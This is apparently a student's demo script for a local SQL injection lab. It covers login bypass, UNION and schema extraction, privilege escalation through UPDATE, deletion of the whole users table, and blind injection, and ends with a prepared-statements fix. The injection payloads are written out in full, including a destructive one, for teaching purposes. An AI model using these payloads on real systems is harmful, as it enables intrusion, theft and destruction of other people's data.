# SQL Injection Lab - Step-by-Step Guide

## Setup (One Time)

### 1. Start MySQL (via XAMPP)

Open XAMPP Control Panel and click **Start** next to **MySQL**.

### 2. Create the Database

Open a terminal and run:

```
mysql -u root -p < "c:\Users\moham\Desktop\sql inj\setup.sql"
```

Enter your MySQL password when prompted. This creates the `sql_injection_lab` database with 3 users:

| Username | Password  | Role  |
|----------|-----------|-------|
| admin    | admin123  | admin |
| user1    | password1 | user  |
| user2    | letmein   | user  |

### 3. Start the PHP Server

```
cd "c:\Users\moham\Desktop\sql inj"
php -S localhost:8000
```

### 4. Open the Lab

Open your browser and go to: **http://localhost:8000**

You will see the main dashboard with 6 lab cards.

---

## Demo Script (Present to Professor)

Below is what to say and do at each step. Follow the order.

---

### LAB 1: Vulnerable Login (Authentication Bypass)

**Open:** Click "Login Bypass" on the dashboard.

**Step 1 - Normal login (baseline)**

| Field    | Value     |
|----------|-----------|
| Username | admin     |
| Password | admin123  |

Click **Log In**. Result: Login successful. This is normal behavior.

**Step 2 - Wrong password (baseline)**

| Field    | Value     |
|----------|-----------|
| Username | admin     |
| Password | wrongpass |

Click **Log In**. Result: Login failed. Password check works.

**Step 3 - SQL Injection attack**

| Field    | Value         |
|----------|---------------|
| Username | `admin' -- `  |
| Password | anything      |

Click **Log In**. Result: Login successful WITHOUT knowing the password.

**What to explain to the professor:**

> The query built by the server is:
> ```sql
> SELECT * FROM users WHERE username='admin' -- ' AND password='anything'
> ```
> The `--` starts a SQL comment. Everything after it is ignored,
> including the password check. The database only sees:
> ```sql
> SELECT * FROM users WHERE username='admin'
> ```
> This is why the attacker gets in without a password.
> The root cause is string concatenation - user input is glued
> directly into the SQL query.

---

### LAB 2: Data Extraction (OR 1=1 + UNION)

**Open:** Go back to dashboard, click "Data Extraction".

**Step 1 - Normal search**

| Field  | Value |
|--------|-------|
| Search | admin |

Click **Search**. Result: Shows only the admin row.

**Step 2 - Dump all users with OR injection**

| Field  | Value           |
|--------|-----------------|
| Search | `' OR '1'='1`   |

Click **Search**. Result: ALL 3 users are displayed with their passwords.

**What to explain:**

> The query becomes:
> ```sql
> SELECT * FROM users WHERE username='' OR '1'='1'
> ```
> Since `'1'='1'` is always true, every row matches.
> The attacker sees the entire users table.

**Step 3 - UNION injection to extract specific columns**

| Field  | Value |
|--------|-------|
| Search | `' UNION SELECT id, username, password, role FROM users -- ` |

Click **Search**. Result: Same data but extracted via a second injected query.

**Step 4 - Extract database schema (advanced)**

| Field  | Value |
|--------|-------|
| Search | `' UNION SELECT 1, table_name, column_name, table_schema FROM information_schema.columns WHERE table_schema='sql_injection_lab' -- ` |

Click **Search**. Result: Shows all table names and column names in the database.

**What to explain:**

> UNION SELECT lets the attacker append their own query.
> They can read any table, including MySQL's internal
> information_schema which lists every table and column
> in the database. This means full database exposure.

---

### LAB 3: Privilege Escalation (UPDATE Injection)

**Open:** Go back to dashboard, click "Privilege Escalation".

Look at the table at the bottom. Note that user1 has role = **user**.

**Step 1 - Inject into the password field to change the role**

| Field        | Value |
|--------------|-------|
| Username     | user1 |
| New Password | `hacked', role='admin' WHERE username='user1' -- ` |

Click **Update Password**. Look at the table: user1 now has role = **admin**.

**What to explain:**

> The query becomes:
> ```sql
> UPDATE users SET password='hacked', role='admin'
>   WHERE username='user1' -- ' WHERE username='user1'
> ```
> The attacker injected `, role='admin'` into the SET clause
> and added their own WHERE clause. They escalated from a
> regular user to an administrator. This is privilege escalation.

Click **Reset Database** to restore the original data.

---

### LAB 4: Delete Injection (Data Destruction)

**Open:** Go back to dashboard, click "Delete Injection".

The table shows all 3 users.

**Step 1 - Delete ALL users**

| Field    | Value           |
|----------|-----------------|
| Username | `' OR '1'='1`   |

Click **Delete User**. Result: The table is now **completely empty**. All 3 users were deleted.

**What to explain:**

> The query becomes:
> ```sql
> DELETE FROM users WHERE username='' OR '1'='1'
> ```
> Since `'1'='1'` is always true, it matches every row.
> The entire table is wiped. In a real application this
> would be catastrophic data loss.

Click **Reset Database** to restore the data.

---

### LAB 5: Blind SQL Injection (Boolean-Based)

**Open:** Go back to dashboard, click "Blind SQL Injection".

**What to explain first:**

> This page is different. It never shows any database data.
> It only says TRUE (user exists) or FALSE (user not found).
> But even this tiny one-bit response is enough to extract
> the entire database, one character at a time.

**Step 1 - Confirm the user exists**

| Field    | Value  |
|----------|--------|
| Username | admin  |

Click **Check**. Result: **TRUE**.

**Step 2 - Guess the first character of admin's password**

| Field    | Value |
|----------|-------|
| Username | `admin' AND SUBSTRING(password,1,1)='a' -- ` |

Click **Check**. Result: **TRUE** - the first character is 'a'.

**Step 3 - Try a wrong guess**

| Field    | Value |
|----------|-------|
| Username | `admin' AND SUBSTRING(password,1,1)='b' -- ` |

Click **Check**. Result: **FALSE** - it's not 'b'.

**Step 4 - Guess the second character**

| Field    | Value |
|----------|-------|
| Username | `admin' AND SUBSTRING(password,2,1)='d' -- ` |

Click **Check**. Result: **TRUE** - the second character is 'd'.

**Step 5 - Check the password length**

| Field    | Value |
|----------|-------|
| Username | `admin' AND LENGTH(password)=8 -- ` |

Click **Check**. Result: **TRUE** - the password is 8 characters long.

**What to explain:**

> By repeating this for each position (1 through 8), the
> attacker reconstructs the full password: a-d-m-i-n-1-2-3.
> In real attacks this is automated with scripts. Even a
> page that shows no data at all is vulnerable if it uses
> string concatenation in SQL queries.

---

### LAB 6: Secure Login (The Fix)

**Open:** Go back to dashboard, click "Secure Login".

**Step 1 - Try the same injection that worked on the vulnerable page**

| Field    | Value         |
|----------|---------------|
| Username | `admin' -- `  |
| Password | anything      |

Click **Log In**. Result: **Login Failed**. The injection does not work.

**Step 2 - Try OR injection**

| Field    | Value           |
|----------|-----------------|
| Username | `' OR '1'='1`   |
| Password | `' OR '1'='1`   |

Click **Log In**. Result: **Login Failed**. Still blocked.

**Step 3 - Prove legitimate login still works**

| Field    | Value     |
|----------|-----------|
| Username | admin     |
| Password | admin123  |

Click **Log In**. Result: **Login Successful**. Real credentials work fine.

**What to explain:**

> The secure version uses **prepared statements** (parameterized queries).
> The SQL structure is sent to MySQL first:
> ```sql
> SELECT * FROM users WHERE username = ? AND password = ?
> ```
> MySQL compiles the query before seeing any user data.
> Then the values are sent separately and treated as pure DATA,
> never as SQL code. Even if the user types `admin' --`, MySQL
> searches for a user literally named `admin' --` (which doesn't exist).
>
> This separation of CODE and DATA is the fundamental fix for
> all SQL injection vulnerabilities.

---

## Summary Slide (What to Tell the Professor)

| Attack Type         | Technique               | Impact                    | Fix                  |
|---------------------|-------------------------|---------------------------|----------------------|
| Auth Bypass         | `admin' --`             | Login without password    | Prepared statements  |
| Data Extraction     | `' OR '1'='1`           | Dump entire database      | Prepared statements  |
| UNION Injection     | `UNION SELECT ...`      | Read any table/column     | Prepared statements  |
| Privilege Escalation| Inject into UPDATE SET  | user becomes admin        | Prepared statements  |
| Data Destruction    | `' OR '1'='1` in DELETE | Wipe entire table         | Prepared statements  |
| Blind SQLi          | `SUBSTRING(password,N,1)` | Extract data char by char | Prepared statements  |

**Root cause:** String concatenation mixes user input with SQL code.

**Fix:** Prepared statements (parameterized queries) separate code from data. The database engine never interprets user input as SQL instructions.

**Defense in depth (additional layers):**
- Input validation and whitelisting
- Least-privilege database accounts (don't use root in apps)
- Web Application Firewalls (WAF)
- Never store passwords in plaintext (use bcrypt/argon2)
- Error messages should never expose SQL details to users
